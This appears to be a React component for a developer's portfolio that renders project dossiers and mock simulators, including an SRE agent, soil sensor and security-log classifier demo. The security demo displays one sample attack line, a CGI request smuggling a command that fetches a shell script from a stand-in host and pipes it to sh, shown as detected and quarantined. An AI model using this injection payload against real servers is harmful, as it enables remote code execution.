import React, { useState } from 'react';
import { Project } from '../types';
import { X, ExternalLink, Activity, Terminal, Shield, Play, RotateCcw, Check, Sparkles } from 'lucide-react';

interface ProjectModalProps {
  project: Project | null;
  onClose: () => void;
}

export const ProjectModal: React.FC<ProjectModalProps> = ({ project, onClose }) => {
  const [activeTab, setActiveTab] = useState<'architecture' | 'simulation'>('architecture');

  // Interactive simulation states
  const [sreIncidentStatus, setSreIncidentStatus] = useState<'healthy' | 'leak' | 'healed'>('healthy');
  const [soilMoisture, setSoilMoisture] = useState(42);
  const [customToolInput, setCustomToolInput] = useState('kernel_reboot_dispatch');
  const [schemaValidated, setSchemaValidated] = useState(true);
  const [socIncidentCount, setSocIncidentCount] = useState(1);

  if (!project) return null;

  return (
    <div
      className="fixed inset-0 z-[95] flex items-center justify-center bg-black/85 backdrop-blur-md p-4 animate-in fade-in duration-200"
      onClick={onClose}
    >
      <div
        className="bg-[#10131a] border border-[#ff8a65]/35 rounded-2xl max-w-3xl w-full p-6 sm:p-8 relative shadow-[0_24px_64px_rgba(0,0,0,0.9)] max-h-[90vh] overflow-y-auto"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Close Button */}
        <button
          type="button"
          onClick={onClose}
          className="absolute top-5 right-5 p-1.5 rounded-full bg-[#151821] border border-white/10 text-slate-400 hover:text-cyan-300 transition-colors cursor-pointer"
        >
          <X className="w-5 h-5" />
        </button>

        {/* Modal Header */}
        <div className="flex items-center gap-2 font-mono text-[11px] text-orange-300 uppercase font-semibold mb-2">
          <span>{project.index}</span>
          <span className="text-slate-600">//</span>
          <span className="text-cyan-300">{project.badge}</span>
        </div>

        <h3 className="font-display text-[26px] sm:text-[30px] text-white font-bold leading-tight mb-1">
          {project.title} — <span className="text-orange-200 font-normal">{project.subtitle}</span>
        </h3>

        {/* Tab Navigation */}
        <div className="flex items-center gap-2 my-4 border-b border-white/10 pb-3">
          <button
            type="button"
            onClick={() => setActiveTab('architecture')}
            className={`px-3 py-1.5 rounded-full font-mono text-[11px] uppercase tracking-wider transition-all cursor-pointer ${
              activeTab === 'architecture'
                ? 'bg-gradient-to-r from-[#ff8a65] to-[#22d3ee] text-[#0b0e15] font-bold'
                : 'bg-[#151821] text-slate-300 hover:text-white'
            }`}
          >
            ARCHITECTURE DOSSIER
          </button>
          <button
            type="button"
            onClick={() => setActiveTab('simulation')}
            className={`px-3 py-1.5 rounded-full font-mono text-[11px] uppercase tracking-wider transition-all cursor-pointer flex items-center gap-1.5 ${
              activeTab === 'simulation'
                ? 'bg-gradient-to-r from-[#ff8a65] to-[#22d3ee] text-[#0b0e15] font-bold'
                : 'bg-[#151821] text-slate-300 hover:text-white'
            }`}
          >
            <Activity className="w-3.5 h-3.5 text-cyan-400" />
            <span>INTERACTIVE SIMULATOR</span>
          </button>
        </div>

        {/* Tab 1: Architecture Dossier */}
        {activeTab === 'architecture' && (
          <div className="space-y-6">
            <p className="font-body text-[15px] text-slate-200 leading-relaxed">
              {project.fullDossier.systemContext}
            </p>

            {/* Execution Pipeline */}
            <div className="p-4 bg-[#080a10] border border-[#ff8a65]/30 rounded-lg">
              <span className="font-mono text-[10px] uppercase text-orange-300 block mb-2 font-bold tracking-wider">
                DATA CONDUIT &amp; EXECUTION PATH:
              </span>
              <div className="font-mono text-[12px] text-cyan-300 leading-relaxed">
                {project.architectureSummary}
              </div>
            </div>

            {/* Key Modules */}
            <div>
              <span className="font-mono text-[10px] uppercase text-slate-400 block mb-3 font-semibold tracking-wider">
                CORE SYSTEM MODULES:
              </span>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                {project.fullDossier.keyModules.map((mod) => (
                  <div
                    key={mod.name}
                    className="p-3.5 rounded-lg bg-[#151821] border border-white/10 flex flex-col justify-between gap-1"
                  >
                    <span className="font-mono text-[11px] text-orange-200 font-bold">{mod.name}</span>
                    <span className="font-mono text-[10px] text-cyan-300">{mod.role}</span>
                    <p className="text-[12px] text-slate-300 font-body leading-normal mt-1">{mod.spec}</p>
                  </div>
                ))}
              </div>
            </div>

            {/* Protocol & Telemetry */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 p-3 bg-[#080a10] border border-cyan-500/20 rounded font-mono text-[11px]">
              <span className="text-slate-400">TELEMETRY_BUS:</span>
              <span className="text-cyan-300 font-medium">{project.fullDossier.telemetryProtocol}</span>
            </div>

            {/* Tags */}
            <div>
              <span className="font-mono text-[10px] uppercase text-slate-400 block mb-2 font-semibold">
                INSTRUMENTATION:
              </span>
              <div className="flex flex-wrap gap-1.5">
                {project.tags.map((t) => (
                  <span
                    key={t}
                    className="px-2.5 py-1 rounded bg-[#151821] border border-cyan-500/30 font-mono text-[11px] text-orange-200"
                  >
                    {t}
                  </span>
                ))}
              </div>
            </div>
          </div>
        )}

        {/* Tab 2: Interactive Simulator */}
        {activeTab === 'simulation' && (
          <div className="space-y-6">
            {/* Simulation for Project 01: YUGĒN */}
            {project.id === 'yugen' && (
              <div className="bg-[#080a10] border border-cyan-500/30 rounded-xl p-5 space-y-4 font-mono text-[12px]">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <span className="text-orange-300 uppercase font-bold text-[11px]">
                    OPTICAL_FEED // YOLOv8 OBJECT DETECTOR
                  </span>
                  <span className="text-cyan-400 text-[11px]">SIMULATED SENSOR STREAM</span>
                </div>

                {/* Simulated Camera Canvas view */}
                <div className="relative h-48 rounded-lg bg-[#121622] border border-white/10 overflow-hidden flex items-center justify-center">
                  <div className="absolute inset-0 bg-[radial-gradient(#22d3ee_1px,transparent_1px)] [background-size:16px_16px] opacity-20" />

                  {/* Simulated YOLO Bounding Box */}
                  <div className="absolute top-8 left-1/4 w-36 h-28 border-2 border-cyan-400 rounded bg-cyan-400/10 flex flex-col justify-between p-1 animate-pulse">
                    <span className="bg-cyan-400 text-black text-[9px] font-bold px-1 rounded self-start">
                      PERSON // CONF 0.942
                    </span>
                    <span className="text-cyan-300 text-[9px] self-end">[x: 184, y: 92]</span>
                  </div>

                  <div className="absolute bottom-6 right-1/4 w-28 h-20 border border-orange-400/80 rounded bg-orange-500/10 flex flex-col justify-between p-1">
                    <span className="bg-orange-500 text-black text-[9px] font-bold px-1 rounded self-start">
                      OBSTACLE // CONF 0.887
                    </span>
                    <span className="text-orange-300 text-[9px] self-end">[x: 412, y: 220]</span>
                  </div>

                  <div className="z-10 text-center pointer-events-none text-slate-500 text-[11px]">
                    ESP32-CAM MJPEG BUS &bull; RESOLUTION: 640x480 &bull; MOTOR PWR: 85%
                  </div>
                </div>

                <div className="grid grid-cols-3 gap-2 text-center text-[11px]">
                  <div className="p-2 bg-[#151821] rounded border border-white/5">
                    <span className="text-slate-400 block text-[10px]">FPS</span>
                    <span className="text-cyan-300 font-bold">28.4</span>
                  </div>
                  <div className="p-2 bg-[#151821] rounded border border-white/5">
                    <span className="text-slate-400 block text-[10px]">INFERENCE</span>
                    <span className="text-orange-300 font-bold">34.2 ms</span>
                  </div>
                  <div className="p-2 bg-[#151821] rounded border border-white/5">
                    <span className="text-slate-400 block text-[10px]">DIRECTION</span>
                    <span className="text-white font-bold">FORWARD-LEFT</span>
                  </div>
                </div>
              </div>
            )}

            {/* Simulation for Project 02: AUTOSRE */}
            {project.id === 'autosre' && (
              <div className="bg-[#080a10] border border-[#ff8a65]/30 rounded-xl p-5 space-y-4 font-mono text-[12px]">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <span className="text-cyan-300 uppercase font-bold text-[11px]">
                    SRE AGENT REINFORCEMENT ENVIRONMENT
                  </span>
                  <span className="text-orange-300 text-[11px]">OPENENV COMPLIANT</span>
                </div>

                <div className="flex items-center gap-3">
                  <button
                    type="button"
                    onClick={() => setSreIncidentStatus('leak')}
                    className="px-3 py-1.5 rounded bg-rose-950/40 border border-rose-500/40 text-rose-200 hover:bg-rose-900/50 cursor-pointer transition-all"
                  >
                    1. INJECT MEMORY LEAK
                  </button>
                  <button
                    type="button"
                    onClick={() => setSreIncidentStatus('healed')}
                    className="px-3 py-1.5 rounded bg-cyan-950/40 border border-cyan-400/40 text-cyan-200 hover:bg-cyan-900/50 cursor-pointer transition-all flex items-center gap-1.5"
                  >
                    <Play className="w-3 h-3 fill-current" />
                    2. RUN RL REMEDIATION
                  </button>
                  <button
                    type="button"
                    onClick={() => setSreIncidentStatus('healthy')}
                    className="px-2.5 py-1.5 rounded bg-[#151821] text-slate-400 hover:text-white cursor-pointer"
                    title="Reset Simulator"
                  >
                    <RotateCcw className="w-3.5 h-3.5" />
                  </button>
                </div>

                <div className="p-4 rounded-lg bg-[#151821] border border-white/10 space-y-2">
                  <div className="flex justify-between">
                    <span className="text-slate-400">CLUSTER TOPOLOGY STATUS:</span>
                    <span
                      className={`font-bold ${
                        sreIncidentStatus === 'healthy'
                          ? 'text-emerald-400'
                          : sreIncidentStatus === 'leak'
                          ? 'text-rose-400 animate-pulse'
                          : 'text-cyan-400'
                      }`}
                    >
                      {sreIncidentStatus === 'healthy' && 'STABLE // 12 NODES HEALTHY'}
                      {sreIncidentStatus === 'leak' && 'CRITICAL // NODE_3 HEAP OOM CRASH'}
                      {sreIncidentStatus === 'healed' && 'REMEDIATED // HEAP REALLOCATED (+1.849 REWARD)'}
                    </span>
                  </div>

                  <div className="flex justify-between text-[11px]">
                    <span className="text-slate-400">AGENT POLICY ACTION:</span>
                    <span className="text-orange-200">
                      {sreIncidentStatus === 'healthy' && 'PASSIVE_HEALTH_OBSERVATION'}
                      {sreIncidentStatus === 'leak' && 'FLAG_ANOMALY -> CALCULATING REMEDIATION PATH'}
                      {sreIncidentStatus === 'healed' && 'POD_DRAIN -> REALLOCATE_HEAP -> RESTART_CONTAINER'}
                    </span>
                  </div>

                  <div className="w-full bg-[#080a10] h-2 rounded overflow-hidden mt-2">
                    <div
                      className={`h-full transition-all duration-500 ${
                        sreIncidentStatus === 'healthy'
                          ? 'w-full bg-emerald-500'
                          : sreIncidentStatus === 'leak'
                          ? 'w-1/3 bg-rose-500'
                          : 'w-[94%] bg-gradient-to-r from-[#ff8a65] to-[#22d3ee]'
                      }`}
                    />
                  </div>
                </div>
              </div>
            )}

            {/* Simulation for Project 03: TERRASENSE */}
            {project.id === 'terrasense' && (
              <div className="bg-[#080a10] border border-cyan-500/30 rounded-xl p-5 space-y-4 font-mono text-[12px]">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <span className="text-orange-300 uppercase font-bold text-[11px]">
                    PRECISION SOIL PROBE TEST HARNESS
                  </span>
                  <span className="text-cyan-300 text-[11px]">LIVE SENSOR CALIBRATION</span>
                </div>

                <div>
                  <div className="flex justify-between mb-2">
                    <span className="text-slate-300">ADJUST SOIL MOISTURE PROBE:</span>
                    <span className="text-cyan-300 font-bold">{soilMoisture}%</span>
                  </div>
                  <input
                    type="range"
                    min={15}
                    max={80}
                    value={soilMoisture}
                    onChange={(e) => setSoilMoisture(Number(e.target.value))}
                    className="w-full accent-[#ff8a65] cursor-pointer"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3 pt-2">
                  <div className="p-3 bg-[#151821] rounded border border-white/5">
                    <span className="text-slate-400 block text-[10px]">PREDICTED HARVEST READINESS</span>
                    <span className="text-orange-200 font-bold text-[13px]">
                      {soilMoisture > 50 ? 'EXCESS WATER RETENTION' : soilMoisture < 30 ? 'CRITICAL DROUGHT' : 'OPTIMAL 98.2%'}
                    </span>
                  </div>
                  <div className="p-3 bg-[#151821] rounded border border-white/5">
                    <span className="text-slate-400 block text-[10px]">SMART VALVE ACTUATOR</span>
                    <span className={`font-bold text-[13px] ${soilMoisture < 35 ? 'text-cyan-400' : 'text-slate-400'}`}>
                      {soilMoisture < 35 ? 'OPEN // PURGING 12L/MIN' : 'CLOSED // STANDBY'}
                    </span>
                  </div>
                </div>
              </div>
            )}

            {/* Simulation for Project 04: OPENENV_PROP */}
            {project.id === 'openenv_prop' && (
              <div className="bg-[#080a10] border border-cyan-500/30 rounded-xl p-5 space-y-4 font-mono text-[12px]">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <span className="text-orange-300 uppercase font-bold text-[11px]">
                    TOOL ARGUMENT DISPATCHER &amp; VALIDATOR
                  </span>
                  <span className="text-cyan-400 text-[11px]">GRADIO JSON HARNESS</span>
                </div>

                <div>
                  <label className="block text-slate-400 text-[10px] mb-1">TARGET AGENT TOOL:</label>
                  <input
                    type="text"
                    value={customToolInput}
                    onChange={(e) => setCustomToolInput(e.target.value)}
                    className="w-full bg-[#151821] border border-white/15 rounded px-3 py-2 text-slate-100 font-mono text-[12px] focus:border-cyan-400 outline-none"
                  />
                </div>

                <pre className="p-3 bg-[#12151e] border border-white/10 rounded text-[11px] text-cyan-200 overflow-x-auto">
                  <code>
                    {JSON.stringify(
                      {
                        tool: customToolInput,
                        args: {
                          target_id: 'srv-prod-asia-01',
                          grace_period_sec: 15,
                          drain_connections: true
                        },
                        status: 'VALIDATED // READY'
                      },
                      null,
                      2
                    )}
                  </code>
                </pre>
              </div>
            )}

            {/* Simulation for Project 05: SOC PIPELINE */}
            {project.id === 'soc_pipeline' && (
              <div className="bg-[#080a10] border border-[#ff8a65]/30 rounded-xl p-5 space-y-4 font-mono text-[12px]">
                <div className="flex items-center justify-between border-b border-white/10 pb-2">
                  <span className="text-orange-300 uppercase font-bold text-[11px]">
                    REAL-TIME SIEM THREAT INGESTION
                  </span>
                  <span className="text-rose-400 text-[11px]">HUGGING FACE CLASSIFIER</span>
                </div>

                <div className="flex items-center justify-between">
                  <span className="text-slate-300">SIMULATE SIEM LOG PACKET:</span>
                  <button
                    type="button"
                    onClick={() => setSocIncidentCount((c) => c + 1)}
                    className="px-3 py-1.5 rounded bg-orange-500/20 border border-[#ff8a65]/40 text-orange-200 hover:bg-orange-500/30 cursor-pointer font-bold text-[11px]"
                  >
                    + TRIGGER LOG #{socIncidentCount}
                  </button>
                </div>

                <div className="p-3 bg-[#151821] rounded border border-rose-500/30 space-y-1 text-[11px]">
                  <div className="text-slate-400">PAYLOAD EVENT STREAM:</div>
                  <div className="text-white font-semibold">
                    GET /cgi-bin/test-cgi?`curl -s http://198.51.100.22/shell.sh|sh`
                  </div>
                  <div className="text-cyan-300 font-bold">
                    MODEL CONFIDENCE: 98.8% // CLASSIFICATION: REVERSE_SHELL_INJECTION
                  </div>
                  <div className="text-rose-400">STATUS: AUTO-QUARANTINE ENFORCED</div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Modal Footer */}
        <div className="pt-6 border-t border-white/10 flex items-center justify-between mt-6">
          <a
            href={project.fullDossier.githubUrl}
            target="_blank"
            rel="noopener noreferrer"
            className="h-10 px-5 rounded-full bg-gradient-to-r from-[#ff8a65] to-[#22d3ee] text-[#0b0e15] font-mono text-[11px] uppercase tracking-wider font-bold flex items-center gap-2 shadow-md hover:scale-105 transition-transform"
          >
            <span>INSPECT ON GITHUB</span>
            <ExternalLink className="w-3.5 h-3.5" />
          </a>

          <button
            type="button"
            onClick={onClose}
            className="font-mono text-[11px] text-slate-400 hover:text-orange-200 uppercase tracking-wider cursor-pointer"
          >
            CLOSE DOSSIER
          </button>
        </div>
      </div>
    </div>
  );
};
